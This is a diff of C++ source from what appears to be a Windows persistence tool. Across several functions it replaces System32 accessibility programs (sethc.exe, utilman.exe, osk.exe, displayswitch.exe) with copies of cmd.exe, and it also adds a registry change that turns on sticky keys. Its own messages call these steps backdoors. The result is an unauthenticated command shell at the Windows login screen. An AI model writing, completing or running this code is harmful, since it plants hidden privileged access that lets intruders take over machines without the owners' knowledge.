@@ -195,33 +195,63 @@ void cleanup() {
     }
 }
 
+bool backup_file(const std::string& originalPath) {
+    std::string backupPath = "C:\\Windows\\System32\\old-" + originalPath.substr(originalPath.find_last_of("\\") + 1);
 
-void sticky_keys() {
-    //makes sure that sticky keys is turned on
-    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f >nul 2>&1"),
-        "reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
+    // Skip if backup already exists
+    if (GetFileAttributesA(backupPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+        return true;
+    }
 
-    //replaces sethc.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe >nul 2>&1"), "rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
+    std::string backupCmd = "copy \"" + originalPath + "\" \"" + backupPath + "\" >nul 2>&1";
+    if (system(backupCmd.c_str()) != 0) {
+        std::cout << "\033[1;31m\tFailed to backup: " << originalPath << "\033[0m" << std::endl;
+        return false;
+    }
+    return true;
 }
 
+void sticky_keys() {
+    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f >nul 2>&1"),
+        "reg add StickyKeys registry");
+
+    std::string originalPath = "C:\\Windows\\System32\\sethc.exe";
+    if (backup_file(originalPath)) {
+        error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe >nul 2>&1"), "rename sethc.exe");
+        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "copy cmd.exe to sethc.exe");
+        std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
+    }
+}
+
+// Apply the same pattern to other functions:
 void utility_manager() {
-    //replaces utilman.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe >nul 2>&1"), "rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
+    std::string originalPath = "C:\\Windows\\System32\\utilman.exe";
+    if (backup_file(originalPath)) {
+        error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe >nul 2>&1"), "rename utilman.exe");
+        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "copy cmd.exe to utilman.exe");
+        std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
+    }
 }
 
 void on_screen_keyboard() {
-    //replaces osk.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe >nul 2>&1"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
+    std::string originalPath = "C:\\Windows\\System32\\osk.exe";
+    if (GetFileAttributesA(originalPath.c_str()) != INVALID_FILE_ATTRIBUTES && backup_file(originalPath)) {
+        error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe >nul 2>&1"), "rename osk.exe");
+        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe >nul 2>&1"), "copy cmd.exe to osk.exe");
+        std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
+    }
+    else {
+        std::cout << "\033[1;33m\tSkipped On-Screen Keyboard (file not found)\033[0m" << std::endl;
+    }
 }
 
 void display_switch() {
-    //replaces displayswitch.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe >nul 2>&1"), "rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
+    std::string originalPath = "C:\\Windows\\System32\\displayswitch.exe";
+    if (backup_file(originalPath)) {
+        error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe >nul 2>&1"), "rename displayswitch.exe");
+        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "copy cmd.exe to displayswitch.exe");
+        std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
+    }
 }
 
 void ifeo_keys() {
